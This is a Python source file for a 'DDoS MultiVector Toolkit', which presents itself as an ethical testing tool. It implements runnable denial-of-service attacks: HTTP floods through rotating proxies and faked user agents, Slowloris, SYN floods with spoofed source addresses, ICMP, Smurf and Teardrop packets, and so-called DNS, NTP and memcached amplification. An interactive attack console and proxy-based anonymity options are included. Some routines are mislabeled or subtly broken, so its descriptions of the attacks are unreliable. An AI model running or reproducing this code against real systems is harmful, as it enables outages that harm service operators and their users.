#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs
# Required-Stop:     $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: DDoS Attack Toolkit
# Description:       A toolkit designed for simulating various types of Distributed Denial of Service (DDoS) attacks for ethical cybersecurity testing.
# Author:
# + MIDØ <https://github.com/Midohajhouj>
# Version:           v.1.0
# License:           MIT License - https://opensource.org/licenses/MIT
### END INIT INFO ###

# =======================================
#      Libraries Used in the Script
# =======================================

import aiohttp          # Asynchronous HTTP requests for simulating attacks.
import asyncio          # Managing asynchronous tasks and event loops.
import time             # Time-based operations like delays and performance tracking.
import argparse         # Parsing command-line arguments.
import threading        # Managing multi-threaded execution of tasks.
import random           # Randomized data generation for attack patterns.
import json             # Handling JSON data for configuration or logging.
from itertools import cycle  # Iterating over proxies or targets repeatedly.
from collections import deque  # High-performance queues for managing tasks or logs.
from uuid import uuid4  # Generating unique identifiers for sessions or payloads.
from base64 import b64encode  # Encoding payloads in Base64 format.
import hashlib          # Cryptographic hashing for secure data handling.
import zlib             # Data compression for efficient payload delivery.
import hmac             # Message authentication using cryptographic hashes.
import signal           # Handling system signals for clean shutdowns.
import sys              # System-level operations like exit or argument parsing.
import os               # Interacting with the file system and environment.
import socket           # Low-level networking operations.
import logging          # Recording execution logs and errors.
from logging.handlers import RotatingFileHandler  # Log rotation for managing large log files.
import psutil           # Monitoring and managing system resource usage.
import scapy.all as scapy  # Crafting and analyzing network packets for attacks.
import dns.resolver     # Resolving DNS queries for target IP addresses.
from colorama import init, Fore, Style  # Adding color to terminal output for clarity.
from tqdm import tqdm   # Progress bar for visual feedback during operations.
import cmd              # Building interactive command-line interfaces.
import ssl              # Secure Sockets Layer for encryption and secure connections.

# =============================
#  DDoS Toolkit Main Functions
# =============================
# Initialize colorama for colorized terminal output
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)
stop_event = threading.Event()

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

# Logging setup with rotation
log_file = "/opt/DDoS-Toolkit/logs/load_test.log"
os.makedirs(os.path.dirname(log_file), exist_ok=True)
handler = RotatingFileHandler(log_file, maxBytes=10 * 1024 * 1024, backupCount=5)  # 10 MB per file, keep 5 backups
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[handler, logging.StreamHandler()]
)

def display_banner():
    print(f"""
{BLUE}
██████████████████████████████████████████████████████
██                                                  ██
██            DDoS MultiVector Toolkit              ██
██   USE WITH CAUTION, PROCEED AT YOUR OWN RISK.    ██                                  
██                MIDØ SALUTES YOU                  ██
██                                                  ██
██████████████████████████████████████████████████████
{RESET}
""")


def minimal_help():
    print(f"""
{YELLOW}DDoS MultiVector Toolkit Coded by MIDØ
{YELLOW}Usage: ddos [options]
{RESET}
Options:
  -h, --help            Show the full help message and exit
  -i, --interactive     Start the interactive CLI
  -u URL, --url URL     Target URL or IP address
  -a ATTACK_MODE, --attack-mode ATTACK_MODE
                        Type of attack to perform (http-flood, slowloris, etc.)
  -t THREADS, --threads THREADS
                        Number of threads
  -r RATE_LIMIT, --rate-limit RATE_LIMIT
                        Rate limit for requests per second
  -d DURATION, --duration DURATION
                        Attack duration (seconds)
  --proxies PROXIES     File containing proxy list
  --results RESULTS     File to save results (JSON)
{RESET}
Example:
  ddos -u 192.168.48.165
  ddos -i  # Start interactive mode
""")


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DDoS Toolkit Coded By MIDØ")
    parser.add_argument("-u", "--url", required=False, help="Target URL or IP address")
    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood", "ssl-flood", "http2-flood", "ntp-amplification", "memcached-amplification", "smurf", "teardrop"], default="http-flood", help="Type of attack to perform")
    parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-r", "--rate-limit", type=int, default=100, help="Rate limit for requests per second")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
    parser.add_argument("-d", "--duration", type=int, default=1500, help="Attack duration (seconds)")
    parser.add_argument("--anonymizer", choices=["start", "stop"], help="Enable or disable anonymizer for anonymity")
    parser.add_argument("--proxies", help="File containing proxy list")
    parser.add_argument("--headers", help="Custom headers as JSON string")
    parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
    parser.add_argument("--results", help="File to save results (JSON)")
    parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
    parser.add_argument("-user", "--user-agents", help="File containing custom user-agent strings")
    parser.add_argument("-m", "--multi-target", help="File containing multiple target URLs or IPs")
    parser.add_argument("-i", "--interactive", action="store_true", help="Start the interactive CLI")
    return parser.parse_args()


def load_proxies(proxy_file: str):
    """Load proxies from a file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        logging.info(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        logging.error(f"Proxy file '{proxy_file}' not found.")
        return []


async def validate_proxies(proxies):
    """Validate proxies."""
    validated_proxies = []
    async with aiohttp.ClientSession() as session:
        tasks = [check_proxy(session, proxy) for proxy in proxies]
        results = await asyncio.gather(*tasks)
        validated_proxies = [proxy for proxy, is_valid in zip(proxies, results) if is_valid]
    logging.info(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies


async def check_proxy(session, proxy: str):
    """Check if a proxy is valid."""
    try:
        async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
            return response.status == 200
    except Exception as e:
        logging.error(f"Proxy validation error: {e}")
        return False


async def monitor_proxy_health(proxies):
    """Continuously monitor the health of proxies."""
    while not stop_event.is_set():
        async with aiohttp.ClientSession() as session:
            tasks = [check_proxy_health(session, proxy) for proxy in proxies]
            results = await asyncio.gather(*tasks)
            for proxy, is_healthy in zip(proxies, results):
                if not is_healthy:
                    proxies.remove(proxy)
                    logging.info(f"Removed unhealthy proxy: {proxy}")
        await asyncio.sleep(60)  # Check every 60 seconds


async def check_proxy_health(session, proxy: str):
    """Check the health of a proxy."""
    try:
        async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
            return response.status == 200
    except Exception as e:
        logging.error(f"Proxy health check error: {e}")
        return False


def generate_payload(payload_type: str):
    """Generate a payload for HTTP requests."""
    payload_id = str(uuid4())
    data = b64encode(os.urandom(64)).decode()
    payload = {"id": payload_id, "data": data}

    # Sign the payload using HMAC
    secret_key = b"your_secret_key"  # Replace with a secure key
    payload_str = json.dumps(payload)
    signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
    payload["signature"] = signature

    # Compress the payload using zlib
    if payload_type == "json":
        compressed_payload = zlib.compress(json.dumps(payload).encode())
        return compressed_payload
    elif payload_type == "xml":
        xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
        compressed_payload = zlib.compress(xml_payload.encode())
        return compressed_payload
    elif payload_type == "form":
        return payload
    else:
        return None


async def resolve_target(target_url: str):
    """Resolve the target URL to an IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            logging.info(f"Target is an IP address: {domain_or_ip}")
            return domain_or_ip
        # Use dnspython to resolve the domain to an IP
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        logging.info(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None


def is_valid_ip(ip: str):
    """Check if the given string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform an HTTP flood attack with improved concurrency and payload variation."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload, timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                await asyncio.sleep(pause_time)


async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
    """Perform a Slowloris attack with improved connection persistence and dynamic headers."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        # Send a partial HTTP request
                        async with session.get(target_url, headers=headers, proxy=next(proxy_pool) if proxy_pool else None) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        # Keep the connection open by sending partial data
                        await asyncio.sleep(pause_time)
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)


def syn_flood(target_ip, target_port, duration):
    """Perform a SYN flood attack with enhanced packet crafting and rate control."""
    logging.info(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a SYN packet with random source IP and port
            ip_layer = scapy.IP(src=f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}", dst=target_ip)
            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during SYN flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("SYN flood attack completed.")


def icmp_flood(target_ip, duration):
    """Perform an ICMP flood attack with enhanced packet variation and rate control."""
    logging.info(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft an ICMP packet with random payload
            packet = scapy.IP(dst=target_ip) / scapy.ICMP() / ("X" * random.randint(64, 128))
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during ICMP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("ICMP flood attack completed.")


async def dns_amplification(target_ip, duration):
    """Perform a DNS amplification attack with enhanced query variation and rate control."""
    logging.info(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    dns_queries = ["example.com", "google.com", "yahoo.com", "bing.com", "amazon.com"]
    while time.time() - start_time < duration:
        try:
            # Craft a DNS amplification packet with random query
            query = random.choice(dns_queries)
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=query))
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during DNS amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("DNS amplification attack completed.")


def ftp_flood(target_ip, target_port, duration):
    """Perform an FTP flood attack with improved connection management and payload variation."""
    logging.info(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target FTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Send a random payload
            sock.send(os.urandom(random.randint(512, 1024)))
            sock.close()
        except Exception as e:
            logging.error(f"Error during FTP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("FTP flood attack completed.")


def ssh_flood(target_ip, target_port, duration):
    """Perform an SSH flood attack with improved connection management and payload variation."""
    logging.info(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target SSH server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Send a random payload
            sock.send(os.urandom(random.randint(512, 1024)))
            sock.close()
        except Exception as e:
            logging.error(f"Error during SSH flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("SSH flood attack completed.")


async def ssl_flood(target_ip, target_port, duration):
    """Perform an SSL/TLS flood attack by exhausting server resources with handshakes."""
    logging.info(f"Starting SSL/TLS flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    context = ssl.create_default_context()

    while time.time() - start_time < duration:
        try:
            # Create a socket and wrap it with SSL/TLS
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
            ssl_sock.connect((target_ip, target_port))
            # Send a partial handshake and close the connection
            ssl_sock.close()
        except Exception as e:
            logging.error(f"Error during SSL/TLS flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("SSL/TLS flood attack completed.")


async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform an HTTP/2 flood attack with enhanced features and rate limiting."""
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)


def ntp_amplification(target_ip, duration):
    """Perform an NTP amplification attack."""
    logging.info(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft an NTP amplification packet
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during NTP amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("NTP amplification attack completed.")


def memcached_amplification(target_ip, duration):
    """Perform a Memcached amplification attack."""
    logging.info(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a Memcached amplification packet
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during Memcached amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("Memcached amplification attack completed.")


def smurf_attack(target_ip, duration):
    """Perform a Smurf attack."""
    logging.info(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a Smurf attack packet
            packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during Smurf attack: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("Smurf attack completed.")


def teardrop_attack(target_ip, duration):
    """Perform a Teardrop attack."""
    logging.info(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a Teardrop attack packet
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
            packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
            scapy.send(packet, verbose=False)
            scapy.send(packet2, verbose=False)
        except Exception as e:
            logging.error(f"Error during Teardrop attack: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("Teardrop attack completed.")


def display_status(stop_event: threading.Event, duration: int, results_file=None):
    """Display the status of the load test with colorized output."""
    start_time = time.time()
    results = []

    with tqdm(total=duration, desc="Progress") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break

            with requests_lock:
                current_time = time.time()
                rps = requests_sent / max(1, current_time - start_time)
                rps_history.append(rps)

                # Calculate network usage in megabytes
                network_usage_mb = (psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv) / (1024 ** 2.65)

                stats = {
                    "Time": elapsed,
                    "Requests Sent": requests_sent,
                    "Successful Requests": successful_requests,
                    "Failed Requests": failed_requests,
                    "RPS": rps,
                    "CPU Usage": psutil.cpu_percent(),
                    "Memory Usage": psutil.virtual_memory().percent,
                    "Network Usage": network_usage_mb,
                }
                results.append(stats)

                # Print formatted statistics
                print(
                    f"{GREEN}Requests Sent: {requests_sent} | "
                    f"{GREEN}Successful: {successful_requests} | "
                    f"{RED}Failed: {failed_requests} | "
                    f"{BLUE}RPS: {rps:.2f} | "
                    f"{YELLOW}CPU: {stats['CPU Usage']}% | "
                    f"{YELLOW}Memory: {stats['Memory Usage']}% | "
                    f"{BLUE}Network: {stats['Network Usage']:.2f} MB{RESET}"
                )

            pbar.update(1)
            time.sleep(1)

    # Save results to a file if specified
    if results_file:
        with open(results_file, "w") as f:
            json.dump(results, f, indent=4)
        logging.info(f"Results saved to {results_file}")


def calculate_rps_stats():
    """Calculate RPS statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }


def signal_handler(sig, frame):
    """Handle interrupt signals."""
    global stop_event
    logging.info(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    stop_event.set()  # Signal all threads to stop
    sys.exit(0)


class DDoSToolkitCLI(cmd.Cmd):
    """Interactive CLI for the DDoS Toolkit."""
    prompt = 'ddos_toolkit> '

    def do_attack(self, arg):
        """Start an attack with the specified parameters."""
        args = arg.split()
        if len(args) < 2:
            logging.error(f"{RED}Usage: attack <url> <attack-mode> [options]{RESET}")
            return

        target_url = args[0]
        attack_mode = args[1]
        options = args[2:]

        # Parse options
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--threads", type=int, default=10)
        parser.add_argument("-r", "--rate-limit", type=int, default=100)
        parser.add_argument("-p", "--pause", type=float, default=0.1)
        parser.add_argument("-d", "--duration", type=int, default=1500)
        parser.add_argument("--proxies", help="File containing proxy list")
        parser.add_argument("--headers", help="Custom headers as JSON string")
        parser.add_argument("--payload", choices=["json", "xml", "form"], default="json")
        parser.add_argument("--retry", type=int, default=3)
        parser.add_argument("--results", help="File to save results (JSON)")
        parsed_args = parser.parse_args(options)

        # Start the attack
        asyncio.run(main(target_url, attack_mode, parsed_args))

    def do_exit(self, arg):
        """Exit the CLI."""
        logging.info(f"{GREEN}Exiting DDoS Toolkit CLI.{RESET}")
        return True


async def main(target_url, attack_mode, args):
    """Main function to run the load test."""
    global stop_event
    stop_event = threading.Event()

    display_banner()

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = await validate_proxies(proxies)
        asyncio.create_task(monitor_proxy_health(proxies))

    headers = json.loads(args.headers) if args.headers else None

    if not await resolve_target(target_url):
        logging.error(f"{RED}Exiting: Target is not reachable.{RESET}")
        return

    tasks = []

    if attack_mode == "syn-flood":
        target_ip = await resolve_target(target_url)
        target_port = 80  # Default port for SYN flood
        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
    elif attack_mode == "icmp-flood":
        target_ip = await resolve_target(target_url)
        threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
    elif attack_mode == "dns-amplification":
        target_ip = await resolve_target(target_url)
        threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
    elif attack_mode == "ftp-flood":
        target_ip = await resolve_target(target_url)
        target_port = 21  # Default port for FTP
        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration)).start()
    elif attack_mode == "ssh-flood":
        target_ip = await resolve_target(target_url)
        target_port = 22  # Default port for SSH
        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
    elif attack_mode == "ssl-flood":
        target_ip = await resolve_target(target_url)
        target_port = 443  # Default port for SSL/TLS
        threading.Thread(target=ssl_flood, args=(target_ip, target_port, args.duration)).start()
    elif attack_mode == "slowloris":
        for _ in range(args.threads):
            task = asyncio.create_task(slowloris_attack(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.retry))
            tasks.append(task)
    elif attack_mode == "http2-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(http2_flood(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
            tasks.append(task)
    elif attack_mode == "ntp-amplification":
        target_ip = await resolve_target(target_url)
        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration)).start()
    elif attack_mode == "memcached-amplification":
        target_ip = await resolve_target(target_url)
        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration)).start()
    elif attack_mode == "smurf":
        target_ip = await resolve_target(target_url)
        threading.Thread(target=smurf_attack, args=(target_ip, args.duration)).start()
    elif attack_mode == "teardrop":
        target_ip = await resolve_target(target_url)
        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration)).start()
    else:
        for _ in range(args.threads):
            task = asyncio.create_task(rate_limited_attack(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
            tasks.append(task)

        # Display status in a separate thread
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()

    # Wait for the specified duration, then stop all tasks
    await asyncio.sleep(args.duration)
    stop_event.set()

    # Wait for all asyncio tasks to complete
    await asyncio.gather(*tasks, return_exceptions=True)

    # Display final statistics
    stats = calculate_rps_stats()
    logging.info(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")

    if args.results:
        logging.info(f"{GREEN}Results saved to {args.results}{RESET}")


if __name__ == "__main__":
    # Handle signals for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Parse arguments
    args = parse_args()

    # If no arguments are provided, display minimal help
    if len(sys.argv) == 1:
        minimal_help()
        sys.exit(0)

    # If interactive mode is enabled, start the CLI
    if args.interactive:
        cli = DDoSToolkitCLI()
        cli.cmdloop()
    else:
        # Otherwise, run the attack directly
        asyncio.run(main(args.url, args.attack_mode, args))
